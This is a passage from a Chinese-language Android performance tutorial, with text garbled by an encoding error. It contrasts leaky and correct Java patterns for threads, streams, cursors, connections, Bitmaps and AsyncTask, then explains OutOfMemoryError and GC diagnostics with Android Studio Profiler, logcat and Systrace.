    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {
        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
        thread = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-comment">// çº¿ç¨‹æŒæœ‰Activityå¼•ç”¨</span>
            <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
                <span class="hljs-comment">// æ— é™å¾ªç¯ï¼Œçº¿ç¨‹ä¸ç»“æŸ</span>
            }
        });
        thread.start();
    }
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šæ­£ç¡®ç®¡ç†çº¿ç¨‹</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">super</span>.onDestroy();
    <span class="hljs-keyword">if</span> (thread != <span class="hljs-literal">null</span>) {
        thread.interrupt();  <span class="hljs-comment">// ä¸­æ–­çº¿ç¨‹</span>
    }
}
</code></pre>
<h5 data-id="heading-55">4.2.2.5 èµ„æºæœªå…³é—­</h5>
<p><strong>æ–‡ä»¶æµæœªå…³é—­ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šæ–‡ä»¶æµæœªå…³é—­</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFile</span><span class="hljs-params">()</span> {
    <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">"file.txt"</span>);
    <span class="hljs-comment">// ä½¿ç”¨fis</span>
    <span class="hljs-comment">// å¿˜è®°å…³é—­ï¼Œå¯¼è‡´èµ„æºæ³„æ¼</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šä½¿ç”¨try-with-resources</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFile</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">"file.txt"</span>)) {
        <span class="hljs-comment">// ä½¿ç”¨fis</span>
        <span class="hljs-comment">// è‡ªåŠ¨å…³é—­</span>
    } <span class="hljs-keyword">catch</span> (IOException e) {
        e.printStackTrace();
    }
}
</code></pre>
<p><strong>æ•°æ®åº“è¿æ¥æœªå…³é—­ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šæ•°æ®åº“è¿æ¥æœªå…³é—­</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">queryDatabase</span><span class="hljs-params">()</span> {
    <span class="hljs-type">SQLiteDatabase</span> <span class="hljs-variable">db</span> <span class="hljs-operator">=</span> getWritableDatabase();
    <span class="hljs-type">Cursor</span> <span class="hljs-variable">cursor</span> <span class="hljs-operator">=</span> db.query(<span class="hljs-string">"table"</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);
    <span class="hljs-comment">// ä½¿ç”¨cursor</span>
    <span class="hljs-comment">// å¿˜è®°å…³é—­cursorå’Œdbï¼Œå¯¼è‡´èµ„æºæ³„æ¼</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šåŠæ—¶å…³é—­</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">queryDatabase</span><span class="hljs-params">()</span> {
    <span class="hljs-type">SQLiteDatabase</span> <span class="hljs-variable">db</span> <span class="hljs-operator">=</span> getWritableDatabase();
    <span class="hljs-keyword">try</span> (<span class="hljs-type">Cursor</span> <span class="hljs-variable">cursor</span> <span class="hljs-operator">=</span> db.query(<span class="hljs-string">"table"</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)) {
        <span class="hljs-comment">// ä½¿ç”¨cursor</span>
        <span class="hljs-comment">// è‡ªåŠ¨å…³é—­cursor</span>
    } <span class="hljs-keyword">finally</span> {
        db.close();  <span class="hljs-comment">// å…³é—­æ•°æ®åº“è¿æ¥</span>
    }
}
</code></pre>
<p><strong>ç½‘ç»œè¿æ¥æœªå…³é—­ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šç½‘ç»œè¿æ¥æœªå…³é—­</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">downloadFile</span><span class="hljs-params">()</span> {
    <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();
    <span class="hljs-comment">// ä½¿ç”¨connection</span>
    <span class="hljs-comment">// å¿˜è®°å…³é—­ï¼Œå¯¼è‡´èµ„æºæ³„æ¼</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šåŠæ—¶å…³é—­</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">downloadFile</span><span class="hljs-params">()</span> {
    <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// ä½¿ç”¨connection</span>
    } <span class="hljs-keyword">finally</span> {
        connection.disconnect();  <span class="hljs-comment">// å…³é—­è¿æ¥</span>
    }
}
</code></pre>
<p><strong>Bitmapæœªé‡Šæ”¾ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šBitmapæœªé‡Šæ”¾</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loadImage</span><span class="hljs-params">()</span> {
    <span class="hljs-type">Bitmap</span> <span class="hljs-variable">bitmap</span> <span class="hljs-operator">=</span> BitmapFactory.decodeFile(<span class="hljs-string">"image.jpg"</span>);
    imageView.setImageBitmap(bitmap);
    <span class="hljs-comment">// å¿˜è®°é‡Šæ”¾bitmapï¼Œå¯¼è‡´å†…å­˜æ³„æ¼</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šåŠæ—¶é‡Šæ”¾</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">super</span>.onDestroy();
    <span class="hljs-keyword">if</span> (bitmap != <span class="hljs-literal">null</span> &amp;&amp; !bitmap.isRecycled()) {
        bitmap.recycle();  <span class="hljs-comment">// é‡Šæ”¾Bitmap</span>
        bitmap = <span class="hljs-literal">null</span>;
    }
}
</code></pre>
<p><strong>AsyncTaskæ³„æ¼ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šAsyncTaskæŒæœ‰Activityå¼•ç”¨</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> {
        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyAsyncTask</span>().execute();  <span class="hljs-comment">// AsyncTaskæŒæœ‰Activityå¼•ç”¨</span>
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAsyncTask</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AsyncTask</span>&lt;Void, Void, Void&gt; {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">protected</span> Void <span class="hljs-title function_">doInBackground</span><span class="hljs-params">(Void... params)</span> {
            <span class="hljs-comment">// é•¿æ—¶é—´è¿è¡Œ</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
    }
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šä½¿ç”¨é™æ€å†…éƒ¨ç±»+å¼±å¼•ç”¨</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAsyncTask</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AsyncTask</span>&lt;Void, Void, Void&gt; {
    <span class="hljs-keyword">private</span> WeakReference&lt;Activity&gt; activityRef;
    
    MyAsyncTask(Activity activity) {
        activityRef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakReference</span>&lt;&gt;(activity);
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> Void <span class="hljs-title function_">doInBackground</span><span class="hljs-params">(Void... params)</span> {
        <span class="hljs-type">Activity</span> <span class="hljs-variable">activity</span> <span class="hljs-operator">=</span> activityRef.get();
        <span class="hljs-keyword">if</span> (activity != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// ä½¿ç”¨activity</span>
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
}
</code></pre>
<h4 data-id="heading-56">4.2.3 å¦‚ä½•é¿å…å†…å­˜æ³„æ¼</h4>
<p><strong>æ­£ç¡®å¤„ç†ç”Ÿå‘½å‘¨æœŸï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">super</span>.onDestroy();
    <span class="hljs-comment">// æ¸…ç†èµ„æº</span>
    handler.removeCallbacksAndMessages(<span class="hljs-literal">null</span>);
    EventBus.getDefault().unregister(<span class="hljs-built_in">this</span>);
    cache.clear();
}
</code></pre>
<p><strong>ä½¿ç”¨å¼±å¼•ç”¨ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å¯¹äºå¯èƒ½æ³„æ¼çš„å¼•ç”¨ï¼Œä½¿ç”¨WeakReference</span>
<span class="hljs-keyword">private</span> WeakReference&lt;Activity&gt; activityRef;
</code></pre>
<p><strong>é¿å…å¾ªç¯å¼•ç”¨ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ³¨æ„å¯¹è±¡ä¹‹é—´çš„ç›¸äº’å¼•ç”¨</span>
<span class="hljs-comment">// åŠæ—¶æ–­å¼€ä¸éœ€è¦çš„å¼•ç”¨</span>
</code></pre>
<p><strong>åˆç†ä½¿ç”¨ç¼“å­˜ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨æœ‰å¤§å°é™åˆ¶çš„ç¼“å­˜ï¼ˆLruCacheï¼‰</span>
<span class="hljs-keyword">private</span> LruCache&lt;String, Bitmap&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LruCache</span>&lt;&gt;(<span class="hljs-number">10</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>);
</code></pre>
<h4 data-id="heading-57">4.3 å†…å­˜æº¢å‡ºï¼ˆOOM - OutOfMemoryErrorï¼‰</h4>
<h4 data-id="heading-58">4.3.1 ä»€ä¹ˆæ˜¯å†…å­˜æº¢å‡º</h4>
<p><strong>å®šä¹‰ï¼š</strong> åº”ç”¨éœ€è¦çš„å†…å­˜è¶…è¿‡äº†ç³»ç»Ÿåˆ†é…çš„é™åˆ¶ï¼Œæ— æ³•åˆ†é…æ–°å¯¹è±¡</p>
<p><strong>Androidå †å†…å­˜æº¢å‡ºï¼š</strong> æœ€å¸¸è§ï¼Œå †å†…å­˜ä¸è¶³</p>
<p><strong>å±å®³ï¼š</strong> åº”ç”¨å´©æºƒï¼Œç”¨æˆ·ä½“éªŒå·®</p>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OOMExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createTooManyObjects</span><span class="hljs-params">()</span> {
        List&lt;Object&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>());  <span class="hljs-comment">// æœ€ç»ˆå¯¼è‡´OOM</span>
        }
    }
}
</code></pre>
<h4 data-id="heading-59">4.3.2 å†…å­˜æº¢å‡ºçš„åŸå› </h4>
<p><strong>å†…å­˜æ³„æ¼å¯¼è‡´ï¼š</strong></p>
<ul>
<li>å¯¹è±¡æ— æ³•å›æ”¶ï¼Œå†…å­˜é€æ¸è¢«å ç”¨</li>
<li>æœ€ç»ˆå¯¼è‡´å†…å­˜ä¸è¶³</li>
</ul>
<p><strong>åˆ›å»ºäº†å¤ªå¤šå¯¹è±¡ï¼š</strong></p>
<ul>
<li>ä¸€æ¬¡æ€§åŠ è½½å¤§é‡æ•°æ®</li>
<li>å¾ªç¯ä¸­åˆ›å»ºå¤§é‡å¯¹è±¡</li>
</ul>
<p><strong>å¤§å¯¹è±¡å ç”¨è¿‡å¤šå†…å­˜ï¼š</strong></p>
<ul>
<li>åŠ è½½è¿‡å¤§çš„å›¾ç‰‡</li>
<li>åˆ›å»ºè¿‡å¤§çš„æ•°ç»„</li>
</ul>
<p><strong>Androidè®¾å¤‡å†…å­˜é™åˆ¶ï¼š</strong></p>
<ul>
<li>ä¸åŒè®¾å¤‡æœ‰ä¸åŒçš„å †å†…å­˜ä¸Šé™</li>
<li>ä½ç«¯è®¾å¤‡å†…å­˜æ›´å°</li>
</ul>
<h4 data-id="heading-60">4.3.3 å¦‚ä½•è§£å†³å†…å­˜æº¢å‡º</h4>
<p><strong>æ’æŸ¥å†…å­˜æ³„æ¼ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨LeakCanaryæ£€æµ‹</li>
<li>ä½¿ç”¨MATåˆ†æå †è½¬å‚¨</li>
<li>ä¿®å¤å†…å­˜æ³„æ¼é—®é¢˜</li>
</ul>
<p><strong>ä¼˜åŒ–å†…å­˜ä½¿ç”¨ï¼š</strong></p>
<ul>
<li>å‡å°‘å¯¹è±¡åˆ›å»º</li>
<li>åŠæ—¶é‡Šæ”¾ä¸éœ€è¦çš„å¯¹è±¡</li>
<li>ä½¿ç”¨å¯¹è±¡æ± å¤ç”¨å¯¹è±¡</li>
</ul>
<p><strong>å¤„ç†å¤§å¯¹è±¡ï¼š</strong></p>
<ul>
<li>å‹ç¼©å›¾ç‰‡å¤§å°</li>
<li>åˆ†æ‰¹åŠ è½½æ•°æ®</li>
<li>åŠæ—¶é‡Šæ”¾å¤§å¯¹è±¡</li>
</ul>
<p><strong>å¢åŠ å†…å­˜é™åˆ¶ï¼ˆæ²»æ ‡ä¸æ²»æœ¬ï¼‰ï¼š</strong></p>
<ul>
<li>åœ¨AndroidManifest.xmlä¸­è®¾ç½®largeHeap="true"</li>
<li>ä½†è¿™ä¸æ˜¯æ ¹æœ¬è§£å†³æ–¹æ¡ˆï¼Œè¿˜æ˜¯è¦ä¼˜åŒ–å†…å­˜ä½¿ç”¨</li>
</ul>
<hr/>
<h2 data-id="heading-61">ç¬¬äº”éƒ¨åˆ†ï¼šAndroid GCæ£€æµ‹ä¸è¯Šæ–­ï¼ˆå·¥å…·å’Œæ–¹æ³•ï¼‰</h2>
<h4 data-id="heading-62">5.1 Android GCæ£€æµ‹å·¥å…·å’Œæ–¹æ³•</h4>
<p><strong>è¯´æ˜ï¼šè¿™éƒ¨åˆ†éƒ½æ˜¯ç”¨æ¥æ£€æµ‹ã€åˆ†æã€è¯Šæ–­GCå’Œå†…å­˜é—®é¢˜çš„å·¥å…·å’Œæ–¹æ³•</strong></p>
<h4 data-id="heading-63">5.1.1 Android Studio Profilerï¼ˆæœ€å¸¸ç”¨çš„å·¥å…·ï¼‰</h4>
<p><strong>ä½œç”¨ï¼š</strong> å®æ—¶ç›‘æ§åº”ç”¨çš„å†…å­˜ã€CPUã€ç½‘ç»œç­‰æ€§èƒ½æ•°æ®</p>
<p><strong>Memory Profilerï¼ˆå†…å­˜åˆ†æå™¨ï¼‰åŠŸèƒ½ï¼š</strong></p>
<ol>
<li>
<p><strong>å®æ—¶æŸ¥çœ‹å†…å­˜ä½¿ç”¨æƒ…å†µ</strong></p>
<ul>
<li>æ˜¾ç¤ºå†…å­˜ä½¿ç”¨æ›²çº¿å›¾</li>
<li>å¯ä»¥çœ‹åˆ°å†…å­˜éšæ—¶é—´çš„å˜åŒ–è¶‹åŠ¿</li>
<li>è¯†åˆ«å†…å­˜æ³„æ¼ï¼ˆå†…å­˜æŒç»­å¢é•¿ï¼‰</li>
</ul>
</li>
<li>
<p><strong>æŸ¥çœ‹GCäº‹ä»¶</strong></p>
<ul>
<li>GCäº‹ä»¶ä¼šåœ¨å†…å­˜æ›²çº¿ä¸Šæ˜¾ç¤ºä¸ºå°å›¾æ ‡</li>
<li>ç‚¹å‡»GCäº‹ä»¶å¯ä»¥æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ï¼š
<ul>
<li>GCç±»å‹ï¼ˆPartial GCã€Full GCã€Sticky GCï¼‰</li>
<li>GCè€—æ—¶ï¼ˆæš‚åœæ—¶é—´ï¼‰</li>
<li>å›æ”¶å‰åçš„å†…å­˜å¤§å°</li>
<li>å›æ”¶äº†å¤šå°‘å†…å­˜</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>ç”Ÿæˆå †è½¬å‚¨ï¼ˆHeap Dumpï¼‰</strong></p>
<ul>
<li>ç‚¹å‡»"Heap Dump"æŒ‰é’®ç”Ÿæˆå †è½¬å‚¨</li>
<li>å¯ä»¥æŸ¥çœ‹å½“å‰æ‰€æœ‰å¯¹è±¡çš„å†…å­˜å ç”¨</li>
<li>å¯ä»¥å¯¼å‡ºä¸ºhprofæ–‡ä»¶ï¼Œç”¨MATåˆ†æ</li>
</ul>
</li>
<li>
<p><strong>æŸ¥çœ‹å¯¹è±¡åˆ†é…æƒ…å†µ</strong></p>
<ul>
<li>ä½¿ç”¨"Allocation Tracking"åŠŸèƒ½</li>
<li>è®°å½•ä¸€æ®µæ—¶é—´å†…çš„å¯¹è±¡åˆ†é…</li>
<li>å¯ä»¥çœ‹åˆ°å“ªäº›å¯¹è±¡è¢«åˆ†é…ï¼Œåœ¨å“ªé‡Œåˆ†é…ï¼ˆè°ƒç”¨æ ˆï¼‰</li>
</ul>
</li>
</ol>
<p><strong>CPU Profilerï¼ˆCPUåˆ†æå™¨ï¼‰åŠŸèƒ½ï¼š</strong></p>
<ul>
<li>æŸ¥çœ‹GCå ç”¨çš„CPUæ—¶é—´</li>
<li>åˆ†æGCå¯¹æ€§èƒ½çš„å½±å“</li>
<li>æŸ¥çœ‹GCçº¿ç¨‹çš„æ‰§è¡Œæƒ…å†µ</li>
</ul>
<p><strong>è¯¦ç»†ä½¿ç”¨æ­¥éª¤ï¼š</strong></p>
<ol>
<li>
<p><strong>æ‰“å¼€Profilerçª—å£</strong></p>
<ul>
<li>åœ¨Android Studioä¸­ï¼Œç‚¹å‡»åº•éƒ¨çš„"Profiler"æ ‡ç­¾</li>
<li>æˆ–é€šè¿‡èœå•ï¼šView â†’ Tool Windows â†’ Profiler</li>
</ul>
</li>
<li>
<p><strong>é€‰æ‹©è¦åˆ†æçš„åº”ç”¨è¿›ç¨‹</strong></p>
<ul>
<li>åœ¨Profilerçª—å£ä¸­é€‰æ‹©è¦åˆ†æçš„åº”ç”¨è¿›ç¨‹</li>
<li>ç¡®ä¿åº”ç”¨æ­£åœ¨è¿è¡Œï¼ˆdebugæ¨¡å¼ï¼‰</li>
</ul>
</li>
<li>
<p><strong>æŸ¥çœ‹å†…å­˜ä½¿ç”¨æƒ…å†µ</strong></p>
<ul>
<li>ç‚¹å‡»"Memory"æ ‡ç­¾</li>
<li>æŸ¥çœ‹å†…å­˜ä½¿ç”¨æ›²çº¿</li>
<li>è§‚å¯Ÿå†…å­˜æ˜¯å¦æŒç»­å¢é•¿ï¼ˆå¯èƒ½çš„å†…å­˜æ³„æ¼ï¼‰</li>
</ul>
</li>
<li>
<p><strong>æŸ¥çœ‹GCäº‹ä»¶</strong></p>
<ul>
<li>åœ¨å†…å­˜æ›²çº¿ä¸­ï¼ŒGCäº‹ä»¶ä¼šæ˜¾ç¤ºä¸ºå°å›¾æ ‡</li>
<li>ç‚¹å‡»GCäº‹ä»¶ï¼Œå¯ä»¥æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯</li>
<li>åˆ†æGCé¢‘ç‡å’Œè€—æ—¶</li>
</ul>
</li>
<li>
<p><strong>ç”Ÿæˆå †è½¬å‚¨</strong></p>
<ul>
<li>ç‚¹å‡»"Heap Dump"æŒ‰é’®</li>
<li>ç­‰å¾…ç”Ÿæˆå®Œæˆ</li>
<li>å¯ä»¥æŸ¥çœ‹å¯¹è±¡åˆ—è¡¨ã€å†…å­˜å ç”¨ç­‰</li>
<li>å¯ä»¥å¯¼å‡ºä¸ºhprofæ–‡ä»¶</li>
</ul>
</li>
<li>
<p><strong>æŸ¥çœ‹å¯¹è±¡åˆ†é…æƒ…å†µ</strong></p>
<ul>
<li>ç‚¹å‡»"Record allocations"æŒ‰é’®å¼€å§‹è®°å½•</li>
<li>æ“ä½œåº”ç”¨ï¼ˆæ¯”å¦‚æ»‘åŠ¨åˆ—è¡¨ï¼‰</li>
<li>ç‚¹å‡»"Stop recording"åœæ­¢è®°å½•</li>
<li>æŸ¥çœ‹å“ªäº›å¯¹è±¡è¢«åˆ†é…ï¼Œåœ¨å“ªé‡Œåˆ†é…</li>
</ul>
</li>
</ol>
<p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>æ—¥å¸¸å¼€å‘æ—¶ç›‘æ§å†…å­˜ä½¿ç”¨</li>
<li>åˆ†æå†…å­˜æ³„æ¼</li>
<li>åˆ†æGCæ€§èƒ½</li>
<li>ä¼˜åŒ–å†…å­˜ä½¿ç”¨</li>
</ul>
<h4 data-id="heading-64">5.1.2 logcatï¼ˆæŸ¥çœ‹GCæ—¥å¿—ï¼‰</h4>
<p><strong>ä½œç”¨ï¼š</strong> æŸ¥çœ‹GCçš„æ—¥å¿—ä¿¡æ¯ï¼Œäº†è§£GCçš„æ‰§è¡Œæƒ…å†µ</p>
<p><strong>GCæ—¥å¿—çš„ä½œç”¨ï¼š</strong></p>
<ul>
<li>äº†è§£GCä½•æ—¶è§¦å‘</li>
<li>äº†è§£GCçš„ç±»å‹å’Œè€—æ—¶</li>
<li>åˆ†æGCé¢‘ç‡æ˜¯å¦è¿‡é«˜</li>
<li>åˆ†æGCå¯¹æ€§èƒ½çš„å½±å“</li>
</ul>
<p><strong>å¦‚ä½•ä½¿ç”¨ï¼š</strong></p>
<p><strong>æ–¹æ³•1ï¼šä½¿ç”¨adb logcatï¼ˆå‘½ä»¤è¡Œï¼‰</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰GCæ—¥å¿—</span>
adb logcat | grep GC

<span class="hljs-comment"># æŸ¥çœ‹ç‰¹å®šåº”ç”¨çš„GCæ—¥å¿—</span>
adb logcat | grep -E <span class="hljs-string">"GC|dalvikvm|art"</span>
</code></pre>
<p><strong>æ–¹æ³•2ï¼šåœ¨Android Studioçš„Logcatçª—å£ä¸­æŸ¥çœ‹</strong></p>
<ul>
<li>æ‰“å¼€Logcatçª—å£ï¼ˆåº•éƒ¨æ ‡ç­¾ï¼‰</li>
<li>åœ¨è¿‡æ»¤æ¡†ä¸­è¾“å…¥"GC"æˆ–"dalvikvm"æˆ–"art"</li>
<li>æŸ¥çœ‹GCç›¸å…³çš„æ—¥å¿—</li>
</ul>
<p><strong>GCæ—¥å¿—æ ¼å¼ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-c" lang="c">GC: AllocSpace concurrent mark sweep freed 
    <span class="hljs-number">12345</span>(<span class="hljs-number">456</span>KB) AllocSpace bytes, 
    <span class="hljs-number">12</span>(<span class="hljs-number">234</span>KB) LOS objects, 
    <span class="hljs-number">50</span>% <span class="hljs-built_in">free</span>, <span class="hljs-number">5</span>MB/<span class="hljs-number">10</span>MB, 
    paused <span class="hljs-number">2.3</span>ms total <span class="hljs-number">15.6</span>ms
</code></pre>
<p><strong>GCæ—¥å¿—åŒ…å«çš„ä¿¡æ¯ï¼š</strong></p>
<ul>
<li><strong>GCç±»å‹</strong>ï¼šPartial GCã€Full GCã€Sticky GC</li>
<li><strong>GCè€—æ—¶</strong>ï¼špausedï¼ˆæš‚åœæ—¶é—´ï¼‰ã€totalï¼ˆæ€»è€—æ—¶ï¼‰</li>
<li><strong>å›æ”¶å‰åçš„å†…å­˜å¤§å°</strong>ï¼šfreedï¼ˆé‡Šæ”¾äº†å¤šå°‘å†…å­˜ï¼‰</li>
<li><strong>å†…å­˜ä½¿ç”¨æƒ…å†µ</strong>ï¼šfreeï¼ˆç©ºé—²å†…å­˜ï¼‰ã€totalï¼ˆæ€»å†…å­˜ï¼‰</li>
<li><strong>GCé¢‘ç‡</strong>ï¼šå¤šä¹…è§¦å‘ä¸€æ¬¡GC</li>
</ul>
<p><strong>å¦‚ä½•åˆ†æGCæ—¥å¿—ï¼š</strong></p>
<ol>
<li>
<p><strong>æŸ¥çœ‹GCé¢‘ç‡</strong></p>
<ul>
<li>ç»Ÿè®¡ä¸€æ®µæ—¶é—´å†…GCçš„æ¬¡æ•°</li>
<li>å¦‚æœGCè¿‡äºé¢‘ç¹ï¼ˆæ¯”å¦‚æ¯ç§’å¤šæ¬¡ï¼‰ï¼Œè¯´æ˜æœ‰é—®é¢˜</li>
<li>å¯èƒ½åŸå› ï¼šé¢‘ç¹åˆ›å»ºå¯¹è±¡ã€å†…å­˜æ³„æ¼</li>
</ul>
</li>
<li>
<p><strong>æŸ¥çœ‹GCè€—æ—¶</strong></p>
<ul>
<li>å…³æ³¨pausedæ—¶é—´ï¼ˆæš‚åœæ—¶é—´ï¼‰</li>
<li>å¦‚æœæš‚åœæ—¶é—´è¿‡é•¿ï¼ˆæ¯”å¦‚&gt;50msï¼‰ï¼Œä¼šå¯¼è‡´å¡é¡¿</li>
<li>Full GCçš„æš‚åœæ—¶é—´é€šå¸¸æ¯”Partial GCé•¿</li>
</ul>
</li>
<li>
<p><strong>æŸ¥çœ‹GCç±»å‹</strong></p>
<ul>
<li>Partial GCï¼šæ­£å¸¸ï¼Œå¿«é€Ÿ</li>
<li>Full GCï¼šéœ€è¦å…³æ³¨ï¼Œå¯èƒ½å¯¼è‡´å¡é¡¿</li>
<li>Sticky GCï¼šæ­£å¸¸ï¼Œå‡ ä¹æ„Ÿè§‰ä¸åˆ°</li>
</ul>
</li>
<li>
<p><strong>æŸ¥çœ‹å†…å­˜å›æ”¶æƒ…å†µ</strong></p>
<ul>
<li>freedï¼šé‡Šæ”¾äº†å¤šå°‘å†…å­˜</li>
<li>å¦‚æœé‡Šæ”¾çš„å†…å­˜å¾ˆå°‘ï¼Œè¯´æ˜å¤§éƒ¨åˆ†å¯¹è±¡è¿˜åœ¨ä½¿ç”¨</li>
<li>å¦‚æœé‡Šæ”¾çš„å†…å­˜å¾ˆå¤šï¼Œè¯´æ˜æœ‰å¾ˆå¤šåƒåœ¾å¯¹è±¡</li>
</ul>
</li>
</ol>
<p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>å¿«é€ŸæŸ¥çœ‹GCæƒ…å†µ</li>
<li>åˆ†æGCé¢‘ç‡å’Œè€—æ—¶</li>
<li>æ’æŸ¥GCå¯¼è‡´çš„æ€§èƒ½é—®é¢˜</li>
</ul>
<h4 data-id="heading-65">5.1.3 Systraceï¼ˆåˆ†æGCå¯¹æ€§èƒ½çš„å½±å“ï¼‰</h4>
<p><strong>ä½œç”¨ï¼š</strong> åˆ†æGCå¯¹æ€§èƒ½çš„å½±å“ï¼Œæ‰¾å‡ºGCå¯¼è‡´çš„å¡é¡¿é—®é¢˜</p>
<p><strong>Systraceæ˜¯ä»€ä¹ˆï¼š</strong></p>
<ul>
<li>Androidç³»ç»Ÿæä¾›çš„æ€§èƒ½åˆ†æå·¥å…·</li>
<li>å¯ä»¥è®°å½•ç³»ç»Ÿå„ä¸ªçº¿ç¨‹çš„æ‰§è¡Œæƒ…å†µ</li>
<li>å¯ä»¥çœ‹åˆ°GCåœ¨ä¸»çº¿ç¨‹ä¸Šçš„æ‰§è¡Œæ—¶é—´</li>
</ul>
<p><strong>å¦‚ä½•ä½¿ç”¨ï¼š</strong></p>
<p><strong>æ–¹æ³•1ï¼šä½¿ç”¨Android Studioçš„Systraceå·¥å…·</strong></p>
<ol>
